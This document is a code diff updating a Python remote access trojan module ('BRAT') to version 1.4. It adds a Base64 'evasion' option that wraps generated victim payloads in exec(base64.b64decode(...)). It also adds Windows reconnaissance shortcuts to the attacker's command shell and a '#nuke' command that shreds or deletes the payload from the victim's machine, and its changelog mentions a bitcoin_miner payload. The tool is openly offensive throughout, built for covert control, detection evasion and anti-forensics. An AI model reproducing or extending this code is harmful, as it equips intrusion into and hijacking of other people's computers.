@@ -18,6 +18,7 @@ try:
 
     # Place your 'import' directives below
     import socket
+    import base64
     from time import asctime
     from time import sleep
 
@@ -33,7 +34,7 @@ except ImportError:
 # Put your module information here.
 info = {
         "name": "Basic Remote Administration Tool", # Module filename (Change this; I recommend you to use the filename as the module name.)
-        "version": "1.3", # version
+        "version": "1.4", # version
         "author": "Catayao56", # Author
         "desc": "A Basic Remote Administration Tool for machines with low-security.", # Brief description
         "email": "Catayao56@gmail.com", # Email
@@ -49,7 +50,7 @@ module_status = 0 # 0  == Stable, 1 == Experimental, 2 == Unstable, 3 == WIP
 category = ['all', 'python', 'catayao56', 'rat', 'rootkit', 'back', 'door', 'remote', 'admin', 'access', 'post', 'exploitation']
 
 # Changelog of the module
-changelog = "Version 1.0:\nInitial module release"
+changelog = "Version 1.4:\nAdded evasion technique options\n\nVersion 1.3:\nAdded bitcoin_miner payload\n\nVersion 1.2:\nMinor bug fix\n\nVersion 1.1:\nMinor bug fix\n\nVersion 1.0:\nInitial module release"
 # Changelog format:
 #
 # changelog = "Version 2.0:\nUpdate Description\n\nVersion1.0\nInitial module release"
@@ -118,6 +119,7 @@ def module_body(global_variables):
     lhost = '127.0.0.1'
     lport = 1337
     payload_type = 'default.py'
+    evasion = 'none'
     output_path = global_variables['OUTPUT_PATH']
     PAYLOAD_PATH = 'modules/BRAT/payloads/'
     payload_filename = 'payload' # For output
@@ -149,14 +151,14 @@ def module_body(global_variables):
                 print("show [OPTION]           :: show values in [OPTION].")
                 print("set [OPTION] [VALUE]    :: set [VALUE] for [OPTION].")
                 print("generate                :: generate payload to send to victim.")
-                print("start [OPTION]          :: start listener/server.")
+                print("start [OPTION]          :: start listener/server. OPTION maybe None or 'custom'.")
                 print()
                 print("quit || exit            :: quit BRAT.")
                 print()
 
             elif command.lower().startswith('manual'):
                 print()
-                print("[1] Set LHOST, LPORT, PAYLOAD_TYPE, and OUTPUT_PATH.")
+                print("[1] Set LHOST, LPORT, PAYLOAD_TYPE, EVASION_TYPE, and OUTPUT_PATH.")
                 print("[2] Generate payload.")
                 print("[3] Send and start payload to victim.")
                 print("[4] Start your server and enjoy! :D")
@@ -170,6 +172,7 @@ def module_body(global_variables):
                         print("LHOST:                   " + str(lhost))
                         print("LPORT:                   " + str(lport))
                         print("Payload Type:            " + str(payload_type))
+                        print("Evasion Type:            " + str(evasion))
                         print("Payload Output filename: " + str(payload_filename))
                         print()
 
@@ -185,6 +188,14 @@ def module_body(global_variables):
                             print("[" + str(iterator) + "] " + payload)
 
                         del iterator
+                        print()
+
+                    elif command[1].lower().startswith(('evasion', 'encod', 'encrypt')):
+                        print()
+                        print("Currently Available Payloads: ")
+                        print()
+                        print("- None")
+                        print("- Base64")
                         print()
 
                 except:
@@ -214,6 +225,18 @@ def module_body(global_variables):
                         else:
                             print("No payload template with that filename is found.")
 
+                    elif command[1].lower().startswith(('evasion', 'encod', 'encrypt', 'type')):
+                        if command[2].lower() == "base64":
+                            evasion = 'Base64'
+
+                        elif command[2].lower() == 'none':
+                            evasion = 'None'
+
+                        else:
+                            evasion = 'None'
+
+                        print('Evasion type set to ' + evasion + '.')
+
                     elif command[1].lower() in ('output', 'path'):
                         ouput = command[2]
                         while pf.path_exists(PAYLOAD_PATH + ouput):
@@ -231,7 +254,25 @@ def module_body(global_variables):
                     print("LHOST   :: set local host IP to connect.")
                     print("LPORT   :: set local port to connect.")
                     print("PAYLOAD :: set payload type to use.")
+                    print("EVASION :: set payload encoding/encryption to use.")
                     print("OUTPUT  :: set output path.")
+                    print()
+                    print("Examples:")
+                    print("    set LHOST 127.0.0.1          (LAN IP)")
+                    print("    set LHOST 284.126.29.48      (WAN IP)")
+                    print()
+                    print("    set LPORT 1337               (Default port)")
+                    print("    set LPORT 8280               (Custom port)")
+                    print()
+                    print("    set PAYLOAD default.py       (Default payload)")
+                    print("    set PAYLOAD time_bomb.py     (Custom payload)")
+                    print()
+                    print("    set EVASION none             (No evasion technique)")
+                    print("    set EVASION base64           (Base64 encoding technique)")
+                    print()
+                    print("    set OUTPUT new_payload.py")
+                    print("    set OUTPUT hello.py")
+                    print()
 
             elif command.lower() in ('generate', 'export'):
                 payload = PAYLOAD_PATH + payload_type
@@ -240,6 +281,20 @@ def module_body(global_variables):
                     payload_script = open(payload, 'r').read()
                     open(payload, 'r').close()
                     payload_script = payload_script.format(lhost, lport)
+
+                    if evasion == 'None':
+                        pass
+
+                    elif evasion == 'Base64':
+                        payload_script = base64.b64encode(payload_script.encode())
+                        payload_script = """\
+import base64
+exec(base64.b64decode({}))\
+""".format(payload_script)
+
+                    else:
+                        pass
+
                     open(output, 'a').write(payload_script)
                     open(output, 'a').close()
                 
@@ -351,8 +406,8 @@ def listener(lhost, lport, global_variables):
     try:
         RAT_Shell(lhost, lport, global_variables, sock_obj, addr_inf[0], addr_inf[1])
 
-    except(KeyboardInterrupt, EOFError) as kb_int:
-        print("[WARNING] " + str(kb_int))
+    except(KeyboardInterrupt, EOFError):
+        print("[WARNING] KeyboardInterrupt or EOF Signal")
         return None
 
     except socket.error:
@@ -386,10 +441,12 @@ def RAT_Shell(lhost, lport, global_variables, sock_obj, rhost, rport):
     print()
 
     # Commands to encode
-    if rplatform in ('windows', 'win', 'nt'):
-        pass
+    if True: # For Windows
+        sysinfo = 'systeminfo'
+        ipc = 'ipconfig /all'
+        nuke_win = 'del \'' + rpayload_name + '\''
 
-    else:
+    if True: # For Linux
         kernel_info = 'cat /proc/version'
         meminfo = 'cat /proc/meminfo'
         nuke_it = 'shred --force -n 35 -u -v -z \'' + rpayload_name + '\''
@@ -397,6 +454,7 @@ def RAT_Shell(lhost, lport, global_variables, sock_obj, rhost, rport):
         crypto = 'cat /proc/crypto'
         check_root = 'which su'
         check_partitions = 'cat /proc/partitions'
+        ifc = 'ifconfig -a'
     
     # Encoding process of commands
     kernel_info = kernel_info.encode()
@@ -406,77 +464,210 @@ def RAT_Shell(lhost, lport, global_variables, sock_obj, rhost, rport):
     crypto = crypto.encode()
     check_root = check_root.encode()
     check_partitions = check_partitions.encode()
+    ifc = ifc.encode()
+
+    sysinfo = sysinfo.encode()
+    ipc = ipc.encode()
+    nuke_win = nuke_win.encode()
 
     print("[i] Type '#help' for information.")
     while True:
         cmd = input('[' + asctime() + ' | ' + global_variables['current_user'] + '@' + rhost + '] ')
 
         if cmd == '#meminfo':
-            sock_obj.send(meminfo)
-            output = sock_obj.recv(100000)
-            output = raw_converter(output)
-            print(output)
-
-        elif cmd == '#cpuinfo':
-            sock_obj.send(cpuinfo)
-            output = sock_obj.recv(100000)
-            output = raw_converter(output)
-            print(output)
-
-        elif cmd == '#crypto':
-            sock_obj.send(crypto)
-            output = sock_obj.recv(100000)
-            output = raw_converter(output)
-            print(output)
-
-        elif cmd == '#kernel_info':
-            sock_obj.send(kernel_info)
-            ab = sock_obj.recv(100000)
-            ab = raw_converter(ab)
-            print(("\n[+] \033[37;1mKernel Version : "+str(ab)))
-
-        elif cmd == '#check_root':
-            sock_obj.send(check_root)
-            a = sock_obj.recv(100000)
-            if a == r'\n/system/bin/su\n':
-                print("\n[*] This Device Is Rooted...\n")
+            if rplatform not in ("windows", "win", "nt"):
+                sock_obj.send(meminfo)
+                output = sock_obj.recv(100000)
+                output = raw_converter(output)
+                print(output)
 
             else:
-                print("\n[*] This Device Is Not Rooted...\n")
+                cmd = cmd.encode()
+                sock_obj.send(cmd)
+                results = sock_obj.recv(100000)
+                results = raw_converter(results)
+                if results == 'bacod':
+                    continue
+
+                print(results)
+
+        elif cmd == '#cpuinfo':
+            if rplatform not in ("windows", "win", "nt"):
+                sock_obj.send(cpuinfo)
+                output = sock_obj.recv(100000)
+                output = raw_converter(output)
+                print(output)
+
+            else:
+                cmd = cmd.encode()
+                sock_obj.send(cmd)
+                results = sock_obj.recv(100000)
+                results = raw_converter(results)
+                if results == 'bacod':
+                    continue
+
+                print(results)
+
+        elif cmd == '#crypto':
+            if rplatform not in ('windows', 'win', 'nt'):
+                sock_obj.send(crypto)
+                output = sock_obj.recv(100000)
+                output = raw_converter(output)
+                print(output)
+
+            else:
+                cmd = cmd.encode()
+                sock_obj.send(cmd)
+                results = sock_obj.recv(100000)
+                results = raw_converter(results)
+                if results == 'bacod':
+                    continue
+
+                print(results)
+
+        elif cmd == '#kernel_info':
+            if rplatform not in ('windows', 'win', 'nt'):
+                sock_obj.send(kernel_info)
+                ab = sock_obj.recv(100000)
+                ab = raw_converter(ab)
+                print(("\n[+] \033[37;1mKernel Version : "+str(ab)))
+
+            else:
+                cmd = cmd.encode()
+                sock_obj.send(cmd)
+                results = sock_obj.recv(100000)
+                results = raw_converter(results)
+                if results == 'bacod':
+                    continue
+
+                print(results)
+
+        elif cmd == '#check_root':
+            if rplatform not in ('windows', 'win', 'nt'):
+                sock_obj.send(check_root)
+                a = sock_obj.recv(100000)
+                if a == r'\n/system/bin/su\n':
+                    print("\n[*] This Device Is Rooted...\n")
+
+                else:
+                    print("\n[*] This Device Is Not Rooted...\n")
+
+            else:
+                cmd = cmd.encode()
+                sock_obj.send(cmd)
+                results = sock_obj.recv(100000)
+                results = raw_converter(results)
+                if results == 'bacod':
+                    continue
+
+                print(results)
 
         elif cmd == '#su':
-            print("\n[*] Command 'SU' Not *Yet* Working...\n")
-            continue
+            if rplatform not in ('windows', 'win', 'nt'):
+                print("\n[*] Command 'SU' Not *Yet* Working...\n")
+                continue
+
+            else:
+                cmd = cmd.encode()
+                sock_obj.send(cmd)
+                results = sock_obj.recv(100000)
+                results = raw_converter(results)
+                if results == 'bacod':
+                    continue
+
+                print(results)
 
         elif cmd == '#check_partitions':
-            sock_obj.send(check_partitions)
-            print('')
-            output = sock_obj.recv(1000000)
-            output = raw_converter(output)
-            print(output)
+            if rplatform not in ('windows', 'win', 'nt'):
+                sock_obj.send(check_partitions)
+                print('')
+                output = sock_obj.recv(1000000)
+                output = raw_converter(output)
+                print(output)
+
+            else:
+                cmd = cmd.encode()
+                sock_obj.send(cmd)
+                results = sock_obj.recv(100000)
+                results = raw_converter(results)
+                if results == 'bacod':
+                    continue
+
+                print(results)
+
+        elif cmd == '#sysinfo':
+            if rplatform in ('windows', 'win', 'nt'):
+                sock_obj.send(sysinfo)
+                results = sock_obj.recv(100000)
+                results = raw_converter(results)
+                print(results)
+
+            else:
+                cmd = cmd.encode()
+                sock_obj.send(cmd)
+                results = sock_obj.recv(100000)
+                results = raw_converter(results)
+                if results == 'bacod':
+                    continue
+
+                print(results)
+
+        elif cmd == '#ipc' or cmd == '#ifc':
+            if rplatform in ('windows', 'win', 'nt'):
+                sock_obj.send(ipc)
+                results = sock_obj.recv(100000)
+                results = raw_converter(results)
+                print(results)
+
+            else:
+                sock_obj.send(ifc)
+                results = sock_obj.recv(100000)
+                results = raw_converter(results)
+                print(results)
 
         elif cmd == '#help':
-            print("""
+            if rplatform in ('windows', 'win', 'nt'):
+                print("""
 =====COMMANDS=====
-#help            : Shows this help menu
-#nuke            : Shred and delete the payload from the victim's machine
-#logout          : Disconnect to client, & keep connection opened for future reconnection.
+#help             : Shows this help menu
+#nuke             : Shred and delete the payload from the victim's machine
+#logout           : Disconnect to client, keep connection opened for future reconnection
+
+=====SHORTCUTS=====
+#sysinfo          : Shorthand for 'systeminfo'
+#ipc              : Shorthand for 'ipconfig'
+""")
+
+            else:
+                print("""
+=====COMMANDS=====
+#help             : Shows this help menu
+#nuke             : Shred and delete the payload from the victim's machine
+#logout           : Disconnect to client, keep connection opened for future reconnection
 
 =====SHORTCUTS=====
 #kernel_info      : Check Kernel Version
 #meminfo          : Check Info Memory Target
 #cpuinfo          : Check Info CPU Target
 #crypto           : Check Encoding On Target
-#check_partitions : Check Info Partisi On Target
+#check_partitions : Check Partition info On Target
+#ifc              : Shorthand for 'ifconfig'
 
 [INFO] You can send any command as long as the remote machine can execute it.
 """)
 
         elif cmd == '#nuke':
-            sock_obj.send(nuke_it)
-            output = sock_obj.recv(100000)
-            output = raw_converter(output)
-            print(output)
+            if rplatform not in ('windows', 'win', 'nt'):
+                sock_obj.send(nuke_it)
+                output = sock_obj.recv(100000)
+                output = raw_converter(output)
+                print(output)
+
+            else:
+                sock_obj.send(nuke_win)
+                output = sock_obj.recv(100000)
+                output = raw_converter(output)
+                print(output)
 
         elif cmd == '#logout':
             #c.close() # We did not close the connection because if we do so, the client will not restart.
